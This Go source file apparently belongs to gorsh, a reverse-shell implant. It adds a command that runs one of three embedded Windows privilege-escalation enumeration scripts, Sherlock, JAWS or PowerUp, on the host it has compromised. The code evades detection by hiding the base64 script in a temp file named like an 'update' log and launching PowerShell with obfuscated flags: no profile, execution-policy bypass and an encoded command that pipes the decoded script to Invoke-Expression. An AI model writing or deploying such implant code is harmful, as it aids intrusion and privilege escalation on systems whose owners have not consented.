package cmds

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"

	"github.com/abiosoft/ishell"
	"github.com/audibleblink/gorsh/internal/enum"
)

func Enum(c *ishell.Context) {
	var script string
	var err error

	choice := c.MultiChoice([]string{
		"sherlock",
		"jaws",
		"powerup",
	}, "Run which script?")

	switch choice {
	case 0:
		script, err = enum.Sherlock().UTF16LEB64()
	case 1:
		script, err = enum.Jaws().UTF16LEB64()
	case 2:
		script, err = enum.PowerUp().UTF16LEB64()
	}
	if err != nil {
		c.Println(err.Error())
		return
	}

	c.ProgressBar().Start()
	out, err := execute(script)
	if err != nil {
		c.ProgressBar().Stop()
		c.Println(out)
		c.Println(err.Error())
		return
	}
	c.ProgressBar().Stop()
	c.Println(string(out))
}

func execute(b64Script string) ([]byte, error) {
	tmpDir, err := ioutil.TempDir("", "logs")
	if err != nil {
		return []byte{}, err
	}
	defer os.Remove(tmpDir)

	tmpfile, err := ioutil.TempFile(tmpDir, "update*.log")
	if err != nil {
		return []byte{}, err
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write([]byte(b64Script)); err != nil {
		return []byte{}, err
	}
	if err := tmpfile.Close(); err != nil {
		return []byte{}, err
	}

	pshell := fmt.Sprintf("$f = Get-Content %s; ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($f)))| iEx", tmpfile.Name())
	pshell64, err := enum.ToUnicode(pshell)
	if err != nil {
		return []byte{}, err
	}

	args := []string{
		"-nOp",
		"-ep",
		"bYpasS",
		"-enc",
		pshell64,
	}

	return exec.Command("powershell", args...).Output()
}
